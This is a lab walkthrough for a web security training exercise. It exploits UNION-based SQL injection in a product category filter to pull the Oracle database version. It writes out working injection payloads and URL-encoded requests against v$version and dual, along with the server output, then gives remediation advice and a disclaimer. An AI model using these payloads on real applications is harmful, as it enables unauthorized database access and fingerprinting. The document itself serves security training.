# 🧪 Lab: SQL Injection Attack – Querying the Database Type and Version on Oracle

**Category:** SQL Injection  
**Difficulty:** Medium  
**Lab Objective:**  
Exploit a SQL injection vulnerability in the product category filter to extract the Oracle database version using a UNION-based SQL injection.

## 🔍 Technical Walkthrough

### 1. Environment Setup

- **Tools Used:**
  - Burp Suite (Proxy, HTTP History, Repeater)
  - Web browser (for direct URL manipulation)
- **Lab URL:**
  ```
  https://<lab-id>.web-security-academy.net
  ```

### 2. Reconnaissance and Injection Point Identification

- **Target Endpoint:**
  ```
  GET /filter?category=Lifestyle HTTP/1.1
  ```
- **Observation:**
  The application filters products based on the `category` parameter. The response reflects the category name, suggesting dynamic SQL queries are used server-side.

### 3. Initial SQL Injection Test

- **Payload Injected:**
  ```
  ' UNION SELECT 'abc','def' FROM dual--
  ```
- **Modified Request:**
  ```
  GET /filter?category='+UNION+SELECT+'abc','def'+FROM+dual-- HTTP/1.1
  ```
- **Response:**
  ```html
  <tbody>
    <tr>
      <th>abc</th>
      <td>def</td>
    </tr>
  </tbody>
  ```
- **Conclusion:**
  The application is vulnerable to UNION-based SQL injection. The use of Oracle’s `dual` table confirms the backend is Oracle.

### 4. Database Version Enumeration

- **Objective:** Extract database version using Oracle’s internal views.
- **Payload Injected:**
  ```
  ' UNION SELECT BANNER, NULL FROM v$version--
  ```
- **Modified Request:**
  ```
  GET /filter?category='+UNION+SELECT+BANNER,+NULL+FROM+v$version-- HTTP/2
  ```
- **Response Output:**
  ```html
  <tr><th>CORE 11.2.0.2.0 Production</th></tr>
  <tr><th>NLSRTL Version 11.2.0.2.0 - Production</th></tr>
  <tr><th>Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production</th></tr>
  <tr><th>PL/SQL Release 11.2.0.2.0 - Production</th></tr>
  <tr><th>TNS for Linux: Version 11.2.0.2.0 - Production</th></tr>
  ```
- **Conclusion:**
  The Oracle database version and components were successfully extracted, confirming the vulnerability and completing the lab.

### 5. Alternative Method (Without Burp Suite)

- **Step 1 – Confirm Injection:**
  ```
  https://<lab-id>.web-security-academy.net/filter?category='+UNION+SELECT+'abc','def'+FROM+dual--
  ```
- **Step 2 – Retrieve Version Info:**
  ```
  https://<lab-id>.web-security-academy.net/filter?category=%27+UNION+SELECT+BANNER,+NULL+FROM+v$version--
  ```
- **Result:**
  The Oracle version details are displayed directly in the browser. Lab marked as complete.

## ⚠️ Security Impact

- **Vulnerability Type:** UNION-based SQL Injection  
- **Risk Level:** High  
- **Potential Consequences:**
  - Unauthorized access to sensitive data
  - Database fingerprinting for targeted exploits
  - Full compromise of backend systems if chained with other vulnerabilities

## 🛡️ Remediation & Prevention

### ✅ Technical Fixes

- **Use Parameterized Queries / Prepared Statements:**  
  Avoid dynamic SQL construction. Use safe query methods provided by frameworks (e.g., `PreparedStatement` in Java, `cursor.execute()` with parameters in Python).

- **Input Validation & Sanitization:**  
  Whitelist expected input formats and reject anything outside the norm.

- **Least Privilege Principle:**  
  Ensure database accounts used by the application have minimal access rights.

- **Error Handling:**  
  Suppress detailed SQL error messages from being displayed to users.

- **Web Application Firewall (WAF):**  
  Deploy WAFs to detect and block common injection patterns.

## 📌 Additional Notes

- The use of Oracle’s `dual` table is a reliable method for testing SELECT statements without querying actual data.
- The `v$version` view is a common target for database fingerprinting and should be protected from unauthorized access.
- The lab demonstrates how even a simple filter parameter can be exploited if not properly secured.

## 📜 Legal & Ethical Disclaimer

This walkthrough is intended solely for educational and authorized penetration testing purposes. Unauthorized testing or exploitation of live systems without explicit permission is illegal and unethical. Always obtain proper consent before conducting security assessments.

**Lab Status:** ✅ *Solved*
